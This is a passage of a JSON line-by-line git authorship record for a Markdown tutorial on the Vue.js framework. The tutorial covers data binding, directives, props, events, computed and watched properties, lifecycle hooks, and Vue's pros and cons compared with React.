        "content": "    `v-model` is a [Vue directive](https://vuejs.org/v2/api/#v-model) used to bind the DOM input field to its data variable."
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "    This allows the DOM variables and data to be \"in sync\", regardless of which one is being updated first."
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "    In other words, if you change the input value, the bound data will change, and vice versa."
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "    ```html"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    \u003cinput type\u003d\"checkbox\", v-model\u003d\"isChecked\"\u003e"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "      \u003clabel for\u003d\"checked\"\u003eSelect\u003c/label\u003e"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    \u003c/input\u003e"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "    ```"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "    When the checkbox is selected, `isChecked` is set to `true`. If the program sets `isChecked` to `false`, then checkbox will be unselected."
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "    This reduces any extra step required to manually update the data."
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "    2-way binding is useful for updating input form bindings such as checkboxes or drop-downs, where new data is entered by users and then updated in the view."
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbr\u003e"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "3. **Conditionals and Loops**\u003cbr\u003e"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    `v-if` allows you to conditionally insert/remove elements based on the truthfulness of the binding value."
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    "
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    `v-for` allows you to loop through and render a list of items."
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    "
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    Following the previous checkbox example, if you want to display a list of messages when the checkbox is checked, you can do the following:"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    ```html"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    \u003cdiv v-if\u003d\"isChecked\"\u003e"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "      \u003cdiv v-for\u003d\"message in messages\"\u003e"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "        \u003cli\u003e{\\{message}\\}\u003c/li\u003e"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "      \u003c/div\u003e"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    \u003c/div\u003e"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    ```"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "\u003cbr\u003e"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": ""
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "4. **Passing Data From Outer to Inner Components**\u003cbr\u003e"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "    When you have components that are nested within each other, data is passed from the outer component to the inner component via `props`, where `props` are just custom data shared between the components."
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "    This follows the [1-way data flow](https://vuejs.org/v2/guide/components-props.html#One-Way-Data-Flow) encouraged by Vue, which"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "    ensures that data can only be changed by the component itself and also allows bugs to be easily traced in the code."
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "    "
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    To pass props to a Vue component, `v-bind:\u003cprop-name\u003e` is used. A demonstration of passing props is shown in the code segment below:"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "    ```js"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "    Vue.component(\u0027todo-list\u0027, {"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "      props: [\u0027item\u0027],"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "      data: [\u0027totalCount\u0027],"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "      template:`"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "        \u003cdiv class\u003d\u0027todo-list\u0027\u003e"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "          \u003cp\u003eTotal:{\\{this.totalCount}\\}\u003c/p\u003e"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "          \u003cp\u003e{\\{item.name}\\}: {\\{item.count}\\}\u003c/p\u003e"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "        \u003c/div\u003e"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "      `"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "    })"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "    \u003ctodo-list"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "      v-for\u003d\u0027item in items\u0027"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "      v-bind:key\u003d\u0027item.id\u0027"
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "      v-bind:item\u003d\u0027item\u0027"
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "    \u003e\u003c/todo-list\u003e"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "    ```"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "    `to-do list` contains `item`, i.e. `to-do list` is the outer component and `item` is the inner component."
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "    \u003cbox type\u003d\"tip\"\u003e"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "    Note that `props` is passed from the outer component to the inner component while `data` is kept private within a component."
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "    \u003c/box\u003e"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbr\u003e"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "5. **Emitting Events**\u003cbr\u003e"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "    However, what if the user decides to update the `item.count`? The data for `item.count` has to be passed from `item` to `todo-list` so that `totalCount` can be updated inside `todo-list` ."
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": "    How do we do that if we have to follow the 1-way data flow rule?"
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": "    In situations where the inner component has to pass data back to the outer component, the inner component has to [emit custom events](https://vuejs.org/v2/guide/components.html#Emitting-a-Value-With-an-Event)"
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "    and the outer component will update after listening to these events."
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "    You can think of emitting events like putting out a flyer about an event. If someone is interested in this event, he or she can gather more information through reading the flyer."
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": "    ```js"
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": "    Vue.component(\u0027item\u0027, {"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": "      data: [\u0027count\u0027, \u0027name\u0027],"
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "      template: `\u003cbutton v-on:click\u003d\"$emit(\u0027increased-count\u0027, count+1)\"\u003eIncrement item count\u003c/button\u003e`"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    })"
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "    /* Inside todo-list component */"
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    template: `\u003citem v-on:increased-count\u003d\"updateCount\" v-for\u003d\"item in items\"/\u003e`"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "    ```"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "   \u003cbox type\u003d\"tip\"\u003e"
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "   "
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "   When the button is clicked, the `item` component will emit a custom event named `increased-count` while the `todo-list` component listens for this event and executes its own `updateCount` method."
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "   \u003c/box\u003e"
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbr\u003e"
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "6. **Computed Properties**\u003cbr\u003e"
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": "    This is useful when you want to compose new data based on the data that has changed."
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": "    Instead of calling methods to do that whenever data has changed, computed properties will do it for you automatically."
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": "    ```js"
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "-"
        },
        "content": "    computed: totalCount() {"
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "      return this.items.reduce((sum, item) \u003d\u003e sum + item.count);"
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "-"
        },
        "content": "    ```"
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": "    Unlike the use of methods, this updating of `totalCount` will only be triggered when the number of `items` in the list or any `item`\u0027s `count` changed."
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": "    Since computed properties are cached and will not be processed every time the page refreshes, this can greatly improve the efficiency of your application."
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": "    \u003cbox type\u003d\"warning\"\u003e"
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": "        Note: computed properties must return the new data i.e. reactive properties."
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "-"
        },
        "content": "        It cannot perform other operations in response to the change in data."
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": "    \u003c/box\u003e"
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbr\u003e"
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "7. **Watched Properties**\u003cbr\u003e"
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "-"
        },
        "content": "    Watched properties are used to call other functions when a particular data has been updated, such as \u003ctooltip content\u003d\"independent operations\"\u003easynchronous operations\u003c/tooltip\u003e."
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "-"
        },
        "content": "    For example, when a new `item` is added, we want to send a notification to our friend to alert him or her about the change."
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "-"
        },
        "content": "    A watched property on `items` can be added so that a notification can be sent whenever `items` has changed."
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "-"
        },
        "content": "    ```js"
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "-"
        },
        "content": "    watch: {"
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "-"
        },
        "content": "      totalCount: function() {"
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "        this.totalCount \u003d this.items.reduce((sum, item) \u003d\u003e sum + item.count);"
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "-"
        },
        "content": "        // notify friend about the change"
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "-"
        },
        "content": "      }"
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "-"
        },
        "content": "    ```"
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "-"
        },
        "content": "    This may look quite similar to `Computed properties`."
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "-"
        },
        "content": "    To decide which is more suitable for your feature, here is a brief comparison:"
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "-"
        },
        "content": "    Watched property | Computed property"
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "-"
        },
        "content": "    :-------------- | :----------------"
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "-"
        },
        "content": "    used for running expensive operations | used for updating data for dependencies"
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "-"
        },
        "content": "    executed every time page refreshes | uses cached data and executes only when changed"
      },
      {
        "lineNumber": 243,
        "author": {
          "gitId": "-"
        },
        "content": "    **watches** for change in 1 property | **creates** a new property that is updated when 1 or more dependencies change"
      },
      {
        "lineNumber": 244,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 245,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbr\u003e"
      },
      {
        "lineNumber": 246,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 247,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "8. **Lifecycle Hooks**\u003cbr\u003e"
      },
      {
        "lineNumber": 248,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    Every Vue instance goes through a series of initialization steps when it is created, i.e. setting up data observation, compiling the template, mounting the instance to the DOM, and updating the DOM when data modifies. Along these steps, Vue runs functions in the background called lifecycle hooks, allowing users to add code at each stage that could improve its rendering speed.\u003cbr/\u003e\u003cbr/\u003e"
      },
      {
        "lineNumber": 249,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    The following diagram shows all lifecycle hooks and their specific execution stages:\u003cbr/\u003e"
      },
      {
        "lineNumber": 250,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    ![Vue\u0027s Lifecycle Diagram](javascript-framework-vue-images/vue-lifecycle-diagram.png \"Vue\u0027s Lifecycle Diagram\")"
      },
      {
        "lineNumber": 251,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    _Figure 1. Vue\u0027s Lifecycle Diagram_"
      },
      {
        "lineNumber": 252,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "   "
      },
      {
        "lineNumber": 253,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    To run code at a specific stage, you can just define the corresponding hook function and add your code within the function."
      },
      {
        "lineNumber": 254,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    For example, the `created` hook can be used to run code right after the Vue instance is created:"
      },
      {
        "lineNumber": 255,
        "author": {
          "gitId": "-"
        },
        "content": "    ```js"
      },
      {
        "lineNumber": 256,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    Vue.component(\u0027todo-list\u0027, {"
      },
      {
        "lineNumber": 257,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "      ..."
      },
      {
        "lineNumber": 258,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "      created: function() {"
      },
      {
        "lineNumber": 259,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "        console.log(\"to-do list is created.\");"
      },
      {
        "lineNumber": 260,
        "author": {
          "gitId": "-"
        },
        "content": "      }"
      },
      {
        "lineNumber": 261,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    })"
      },
      {
        "lineNumber": 262,
        "author": {
          "gitId": "-"
        },
        "content": "    ```"
      },
      {
        "lineNumber": 263,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "   For more detailed information about Vue lifecycle hooks, visit [here](https://vuejs.org/v2/api/#Options-Lifecycle-Hooks).\u003cbr/\u003e"
      },
      {
        "lineNumber": 264,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "     "
      },
      {
        "lineNumber": 265,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Why use Vue?"
      },
      {
        "lineNumber": 266,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 267,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "Now that we know what Vue is, let us look at some benefits it has to offer."
      },
      {
        "lineNumber": 268,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 269,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Benefit 1: Approachable"
      },
      {
        "lineNumber": 270,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "Vue is very easy to learn. Compared to other framework such as Angular and React, Vue is simple in terms of API and design. Learning enough to build non-trivial applications typically takes less than a day. An example is provided below:\u003cbr/\u003e\u003cbr/\u003e"
      },
      {
        "lineNumber": 271,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "Iteration in React:\u003cbr/\u003e\u003cbr/\u003e"
      },
      {
        "lineNumber": 272,
        "author": {
          "gitId": "-"
        },
        "content": "The JavaScript file in ReactJs"
      },
      {
        "lineNumber": 273,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": ""
      },
      {
        "lineNumber": 274,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 275,
        "author": {
          "gitId": "-"
        },
        "content": "var Iteration \u003d React.createClass({"
      },
      {
        "lineNumber": 276,
        "author": {
          "gitId": "-"
        },
        "content": "  getInitialState() {"
      },
      {
        "lineNumber": 277,
        "author": {
          "gitId": "-"
        },
        "content": "    return {"
      },
      {
        "lineNumber": 278,
        "author": {
          "gitId": "-"
        },
        "content": "      array: [\"Sunday\", \"Monday\", \"Tuesday\", \"Wednesday\", \"Thursday\", \"Friday\", \"Saturday\"]"
      },
      {
        "lineNumber": 279,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 280,
        "author": {
          "gitId": "-"
        },
        "content": "  },"
      },
      {
        "lineNumber": 281,
        "author": {
          "gitId": "-"
        },
        "content": "  render() {"
      },
      {
        "lineNumber": 282,
        "author": {
          "gitId": "-"
        },
        "content": "    this.state.array.map(function(date) {"
      },
      {
        "lineNumber": 283,
        "author": {
          "gitId": "-"
        },
        "content": "      return ("
      },
      {
        "lineNumber": 284,
        "author": {
          "gitId": "-"
        },
        "content": "        \u003cspan\u003e{date}\u003c/span\u003e"
      },
      {
        "lineNumber": 285,
        "author": {
          "gitId": "-"
        },
        "content": "      )"
      },
      {
        "lineNumber": 286,
        "author": {
          "gitId": "-"
        },
        "content": "    });"
      },
      {
        "lineNumber": 287,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 288,
        "author": {
          "gitId": "-"
        },
        "content": "});"
      },
      {
        "lineNumber": 289,
        "author": {
          "gitId": "-"
        },
        "content": "ReactDOM.render(\u003cIteration /\u003e, document.getElementById(\u0027array\u0027));"
      },
      {
        "lineNumber": 290,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 291,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    "
      },
      {
        "lineNumber": 292,
        "author": {
          "gitId": "-"
        },
        "content": "The HTML file in ReactJs"
      },
      {
        "lineNumber": 293,
        "author": {
          "gitId": "-"
        },
        "content": "```html"
      },
      {
        "lineNumber": 294,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv id\u003d\"array\"\u003e\u003c/div\u003e"
      },
      {
        "lineNumber": 295,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 296,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "Iteration in Vue:\u003cbr/\u003e\u003cbr/\u003e"
      },
      {
        "lineNumber": 297,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "The JavaScript file in Vue"
      },
      {
        "lineNumber": 298,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 299,
        "author": {
          "gitId": "-"
        },
        "content": "var Iteration \u003d new Vue({"
      },
      {
        "lineNumber": 300,
        "author": {
          "gitId": "-"
        },
        "content": "  el: \u0027#array\u0027,"
      },
      {
        "lineNumber": 301,
        "author": {
          "gitId": "-"
        },
        "content": "  data: {"
      },
      {
        "lineNumber": 302,
        "author": {
          "gitId": "-"
        },
        "content": "    array: [\"Sunday\", \"Monday\", \"Tuesday\", \"Wednesday\", \"Thursday\", \"Friday\", \"Saturday\"]"
      },
      {
        "lineNumber": 303,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 304,
        "author": {
          "gitId": "-"
        },
        "content": "});"
      },
      {
        "lineNumber": 305,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 306,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "The HTML file in Vue"
      },
      {
        "lineNumber": 307,
        "author": {
          "gitId": "-"
        },
        "content": "```html"
      },
      {
        "lineNumber": 308,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv id\u003d\"array\"\u003e"
      },
      {
        "lineNumber": 309,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "  \u003cspan v-for\u003d\"date in array\"\u003e{\\{date}\\}\u003c/span\u003e"
      },
      {
        "lineNumber": 310,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      },
      {
        "lineNumber": 311,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 312,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 313,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Benefit 2: Progressive"
      },
      {
        "lineNumber": 314,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "Vue is designed from the ground up to be incrementally adoptable. The core library is focused on the view layer only, and is easy to pick up and integrate with other libraries or existing projects. This means that if you have a large application, you can plug Vue into just a part of your application without disturbing the other components. A quote from Evan You - the founder of VueJs is as follows:"
      },
      {
        "lineNumber": 315,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "    \u003e Vue is a more flexible, less opinionated solution (than Angular). That allows you to structure your app the way you want it to be, instead of being forced to do everything the Angular way (Angular requires a certain way to structure an application, making it hard to introduce Angular into an already built project). It’s only an interface layer so you can use it as a light feature in pages instead of a full blown SPA (single-page application)."
      },
      {
        "lineNumber": 316,
        "author": {
          "gitId": "-"
        },
        "content": "    \u003e"
      },
      {
        "lineNumber": 317,
        "author": {
          "gitId": "-"
        },
        "content": "    \u003e -- [[source]](https://www.valuecoders.com/blog/technology-and-apps/vue-js-comparison-angular-react/)"
      },
      {
        "lineNumber": 318,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 319,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Benefit 3: Versatile"
      },
      {
        "lineNumber": 320,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "Vue is perfectly capable of powering sophisticated single-page applications when used in combination with modern tooling and supporting libraries."
      },
      {
        "lineNumber": 321,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": ""
      },
      {
        "lineNumber": 322,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Benefit 4: Clean"
      },
      {
        "lineNumber": 323,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "Vue syntax is simple and this can make the HTML pages very clean. This would allow user interfaces built by Vue to be more maintainable and testable."
      },
      {
        "lineNumber": 324,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 325,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Disadvantages of Vue"
      },
      {
        "lineNumber": 326,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 327,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "Like any other framework/library, Vue has its share of disadvantages."
      },
      {
        "lineNumber": 328,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 329,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "1. **Relatively Small Size Community:**\u003cbr/\u003e"
      },
      {
        "lineNumber": 330,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "Vue is a relatively new JavaScript framework as compared to Angular and React. The size of the community for Vue is therefore relatively small. Although small size community means you can differentiate yourself from other JavaScript developers, it also means there are fewer resources such as tutorials and problem-shooting guides."
      },
      {
        "lineNumber": 331,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 332,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "2. **Language Barriers:**\u003cbr/\u003e"
      },
      {
        "lineNumber": 333,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "A majority of users of Vue are the Chinese as Vue is developed by a Chinese American. He is supportive of the Chinese community and hence a lot of the existing plugins are written in Chinese. There might be some language barriers for an English speaking developer seeking for Vue resources."
      },
      {
        "lineNumber": 334,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 335,
        "author": {
          "gitId": "-"
        },
        "content": "## Resources"
      },
      {
        "lineNumber": 336,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 337,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "Detailed comparison of Vue with other JavaScript frameworks can be found from:"
      },
      {
        "lineNumber": 338,
        "author": {
          "gitId": "-"
        },
        "content": "- [Vue Guild: Comparison with Other Frameworks](https://vuejs.org/v2/guide/comparison.html)"
      },
      {
        "lineNumber": 339,
        "author": {
          "gitId": "-"
        },
